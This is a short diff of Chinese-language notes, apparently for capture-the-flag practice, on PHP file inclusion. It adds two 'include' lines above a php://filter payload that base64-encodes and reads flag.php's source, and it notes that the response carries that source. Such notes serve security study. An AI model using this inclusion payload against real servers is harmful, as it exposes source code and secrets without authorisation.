@@ -5,6 +5,8 @@ allow_url_fopen=on默认开启，一般不用管
 ^
 ## **php伪协议 文件包含读本地php文件源代码**
 ```
+include xx;
+@include(xx);
 include php://filter/read=convert.base64-encode/resource=flag.php
 
 包含返回flag.php文件源码字符串的是base64编码内容
